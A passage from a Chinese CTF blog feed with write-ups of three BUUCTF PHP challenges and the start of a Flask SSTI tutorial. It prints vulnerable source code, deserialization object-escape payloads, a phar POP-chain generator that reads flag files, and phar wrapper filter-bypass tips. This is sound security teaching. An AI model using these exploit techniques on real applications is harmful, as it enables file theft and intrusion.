$_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;  highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;  $userinfo &#x3D; unserialize($serialize_info);  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));  &#125;</code></pre><p>phpinfo里有东西，可以先看看</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210812234826151.png" alt="image-20210812234826151"></p><p>接下来我们应该开始想怎么让</p><p>base64_decode($userinfo[&#39;img&#39;])的值等于flag的文件名</p><p><strong>知识点</strong></p><ul><li>反序列化中的对象逃逸</li><li>extract()变量覆盖</li></ul><p><strong>extract()变量覆盖</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813004733910.png" alt="image-20210813004733910"></p><p>但是这里我们不能直接给img赋值，因为img赋值发生在extract之后</p><p><strong>反序列化中的对象逃逸</strong></p><p><strong>键值逃逸</strong></p><ul><li>因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</li><li>并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号<code>&#123;&#125;</code>外的就都被扔掉。</li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813005203142.png" alt="image-20210813005203142"></p><p>接下来是构造payload的部分</p><p>首先我们需要构造img属性：</p><p>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </p><p>其中的ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64加密的结果然后在这个属性前面随便加上个序列化字符串（只要是合法的就行），比如：</p><p>;s:1:“1”;<br>;s:2:“10”;<br>;s:3:“100”;</p><p>所以payload可以为：</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[phpflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>session中存在phpflag的原因是由于filter函数会将匹配到的值变为空，而phpflag的长度刚好为7</p><p><strong>为7的原因</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813010634981.png" alt="image-20210813010634981"></p><p>但是添加了filter函数来进行过滤之后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813010753030.png" alt="image-20210813010753030"></p><p>原来的内容变为了</p><pre class="language-none"><code class="language-none">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</code></pre><p>能成功实现读取flag所在文件的命令</p><p>post后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813011013959.png" alt="image-20210813011013959"></p><p>对/d0g3_fllllllag进行base64编码后为L2QwZzNfZmxsbGxsbGFn</p><p>所以直接把原来的编码替换掉就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210813011156367.png" alt="image-20210813011156367"></p><p>看是看懂了，但我还是想不到这种payload。。。</p><p>参考文章</p><p><a href="https://blog.csdn.net/weixin_44632787/article/details/119185112?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">安洵杯 2019]easy_serialize_php -------- 反序列化/序列化和代码审计_若丶时光破灭的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">https://www.cnblogs.com/h3zh1/p/12732336.html</a></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>进入后是个登录页面，本来以为是sql注入，试了一下发现没能成功，扫目录扫到<a href="http://www.zip备份文件/">www.zip备份文件</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163607732.png" alt="image-20210903163607732"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903132345413.png" alt="image-20210903132345413"></p><p>访问一下register.php注册个账户就可以登录了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163626344.png" alt="image-20210903163626344"></p><p>再看其他的内容</p><p>profile.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   $username &#x3D; $_SESSION[&#39;username&#39;];   $profile&#x3D;$user-&gt;show_profile($username);   if($profile  &#x3D;&#x3D; null) &#123;      header(&#39;Location: update.php&#39;);   &#125;   else &#123;      $profile &#x3D; unserialize($profile);      $phone &#x3D; $profile[&#39;phone&#39;];      $email &#x3D; $profile[&#39;email&#39;];      $nickname &#x3D; $profile[&#39;nickname&#39;];      $photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));?&gt;</code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phprequire(&#39;config.php&#39;);class user extends mysql&#123;   private $table &#x3D; &#39;users&#39;;   public function is_exists($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::select($this-&gt;table, $where);   &#125;   public function register($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $key_list &#x3D; Array(&#39;username&#39;, &#39;password&#39;);      $value_list &#x3D; Array($username, md5($password));      return parent::insert($this-&gt;table, $key_list, $value_list);   &#125;   public function login($username, $password) &#123;      $username &#x3D; parent::filter($username);      $password &#x3D; parent::filter($password);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      if ($object &amp;&amp; $object-&gt;password &#x3D;&#x3D;&#x3D; md5($password)) &#123;         return true;      &#125; else &#123;         return false;      &#125;   &#125;   public function show_profile($username) &#123;      $username &#x3D; parent::filter($username);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      $object &#x3D; parent::select($this-&gt;table, $where);      return $object-&gt;profile;   &#125;   public function update_profile($username, $new_profile) &#123;      $username &#x3D; parent::filter($username);      $new_profile &#x3D; parent::filter($new_profile);      $where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;      return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;class mysql &#123;   private $link &#x3D; null;   public function connect($config) &#123;      $this-&gt;link &#x3D; mysql_connect(         $config[&#39;hostname&#39;],         $config[&#39;username&#39;],          $config[&#39;password&#39;]      );      mysql_select_db($config[&#39;database&#39;]);      mysql_query(&quot;SET sql_mode&#x3D;&#39;strict_all_tables&#39;&quot;);      return $this-&gt;link;   &#125;   public function select($table, $where, $ret &#x3D; &#39;*&#39;) &#123;      $sql &#x3D; &quot;SELECT $ret FROM $table WHERE $where&quot;;      $result &#x3D; mysql_query($sql, $this-&gt;link);      return mysql_fetch_object($result);   &#125;   public function insert($table, $key_list, $value_list) &#123;      $key &#x3D; implode(&#39;,&#39;, $key_list);      $value &#x3D; &#39;\&#39;&#39; . implode(&#39;\&#39;,\&#39;&#39;, $value_list) . &#39;\&#39;&#39;;       $sql &#x3D; &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;      return mysql_query($sql);   &#125;   public function update($table, $key, $value, $where) &#123;      $sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;      return mysql_query($sql);   &#125;   public function filter($string) &#123;      $escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);      $escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;      $string &#x3D; preg_replace($escape, &#39;_&#39;, $string);      $safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);      $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;      return preg_replace($safe, &#39;hacker&#39;, $string);   &#125;   public function __tostring() &#123;      return __class__;   &#125;&#125;session_start();$user &#x3D; new user();$user-&gt;connect($config);</code></pre><p>update.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php   require_once(&#39;class.php&#39;);   if($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;      die(&#39;Login First&#39;);       &#125;   if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;      $username &#x3D; $_SESSION[&#39;username&#39;];      if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))         die(&#39;Invalid phone&#39;);      if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))         die(&#39;Invalid email&#39;);            if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)         die(&#39;Invalid nickname&#39;);      $file &#x3D; $_FILES[&#39;photo&#39;];      if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)         die(&#39;Photo size error&#39;);      move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));      $profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];      $profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];      $profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];      $profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);      $user-&gt;update_profile($username, serialize($profile));      echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;   &#125;   else &#123;?&gt;</code></pre><p>config.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php   $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;   $config[&#39;username&#39;] &#x3D; &#39;root&#39;;   $config[&#39;password&#39;] &#x3D; &#39;&#39;;   $config[&#39;database&#39;] &#x3D; &#39;&#39;;   $flag &#x3D; &#39;&#39;;?&gt;</code></pre><p>profile里有个file_get_content函数可能有文件读取漏洞，而flag在config.php中，就要让photo=config.php，这里可以利用前边的$profile = unserialize($profile);</p><p>所以再根据</p><pre class="language-php" data-language="php"><code class="language-php">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);     $safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;     return preg_replace($safe, &#39;hacker&#39;, $string);  &#125;</code></pre><p>可以进行反序列化字符逃逸</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903162948758.png" alt="image-20210903162948758"></p><pre class="language-none"><code class="language-none">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>这里这个过滤可以利用抓包将nickename改成数组类型来绕过，由于成数组了，所以才要在where后边加个;}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163055572.png" alt="image-20210903163055572"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220516175618670.png" alt="image-20220516175618670"></p><p>看一下这个your profile页面</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163211494.png" alt="image-20210903163211494"></p><p>看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163313640.png" alt="image-20210903163313640"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210903163322131.png" alt="image-20210903163322131"></p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>文件上传，但是这个flie参数感觉可以直接文件读取</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125203202419.png" alt="image-20211125203202419"></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;&#x2F;title&gt;     &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;     &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; &lt;body&gt;     &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;         &lt;div class&#x3D;&quot;container-fluid&quot;&gt;         &lt;div class&#x3D;&quot;navbar-header&quot;&gt;             &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;首页&lt;&#x2F;a&gt;         &lt;&#x2F;div&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;查看文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;上传文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;             &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;             &lt;&#x2F;ul&gt;         &lt;&#x2F;div&gt;     &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123;     $show-&gt;source &#x3D; $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>upload_file.php</p><pre class="language-none"><code class="language-none">&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt;         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;     &lt;label for&#x3D;&quot;file&quot;&gt;文件名:&lt;&#x2F;label&gt;     &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;     &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename);     echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension &#x3D; end($temp);     if(empty($extension)) &#123;         &#x2F;&#x2F;echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str &#x3D; $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test &#x3D; $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key &#x3D; $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\.\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params &#x3D; array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value &#x3D; $this-&gt;params[$key];        &#125; else &#123;            $value &#x3D; &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text &#x3D; base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125204709437.png" alt="image-20211125204709437"></p><p>肯定是用这个函数来读取flag文件，但是没有反序列化的地方</p><p>所以这里要用phar反序列化</p><p><strong>C1e4r类中有__destruct(),</strong></p><p>__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。</p><p>函数中发现了echo，那么要利用echo $this-&gt;test。</p><p><strong>show类有__toString(),</strong></p><p>__toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。</p><p>利用$this-&gt;str[&#39;str&#39;]-&gt;source;</p><p><strong>Test类有__get（）</strong></p><p>__get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。</p><p>利用 $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</p><p>利用C1e4r类的<code>__destruct()</code>中的echo this-&gt;test<br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>this-&gt;test2.触发Show类的</code>__toString()<code>3.利用Show类的</code>content = $this-&gt;str[&#39;str&#39;]-&gt;source<code>4.触发Test类的</code>__get()<code>5.成功利用</code>file_get()`读文件</p><p>反序列化结果</p><pre class="language-none"><code class="language-none">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a &#x3D; new C1e4r();$b &#x3D; new Show();$c &#x3D; new Test();$a -&gt;str &#x3D; $b;$b -&gt;str[&#39;str&#39;] &#x3D; $c;$c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的$phar-&gt;setMetadata($a); &#x2F;&#x2F;触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;随便写点什么生成个签名$phar-&gt;stopBuffering();?&gt;</code></pre><p>生成phar文件后，改个后缀上传就行，phar的文件不管什么后缀都会直接执行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235333537.png" alt="image-20211125235333537"></p><p>看上传的文件（也可以根据源码推文件名，然后利用phar://协议访问</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235401120.png" alt="image-20211125235401120"></p><p>得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211125235433599.png" alt="image-20211125235433599"></p><p>小tips：如果phar协议被过滤，可以试试用</p><pre class="language-txt" data-language="txt"><code class="language-txt">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;    版本：7.4 +compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;    版本：都可以php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti模板注入</title>
      <link href="/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p> 不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。</p> <span id="more"></span><h2 id="ssti概述"><a href="#ssti概述" class="headerlink" title="ssti概述"></a>ssti概述</h2><p>贴个大佬的文章</p><p><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</a></p><p>[关于python魔术方法payload：““.<strong>class</strong>.<strong>mro</strong><a href="https://blog.csdn.net/xiao__1bai/article/details/115672392">2].<strong>subclasses</strong>()<a href="%E2%80%9C/etc/passwd%E2%80%9C">40</a>.read() 的解释_xiao__1bai的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/104307948?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">模板注入总结_Herbert_555的博客-CSDN博客</a></p><p>SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；<br>漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。</p><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><pre class="language-python" data-language="python"><code class="language-python">__dict__ 保存类实例或对象实例的属性变量键值对字典__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__bases__   返回该对象所继承的基类&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</code></pre><p><strong>flask基本知识</strong></p><p>flask采用装饰器来指定路由，默认的模板渲染引擎为<strong>Jinja2</strong>。其中模板的三种主要语法为</p><ul><li>：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值</li><li>{ % … % }:装载一个控制语句</li><li>:装载一个注释</li></ul><p><strong>流程：</strong></p><ol><li><p>​    获取基本类</p></li><li><p>​    获取基本类的子类</p></li><li><p>​    找到重载过的<code>__init__</code>类</p></li><li><p>​    查看其引用<code>__builtins__</code></p></li><li><p>​    调用其中可用的函数</p></li></ol><p><strong>获取基本类</strong></p><p>​        利用<code>__bases__</code>或者是<code>__mro__</code>函数</p><pre class="language-python" data-language="python"><code 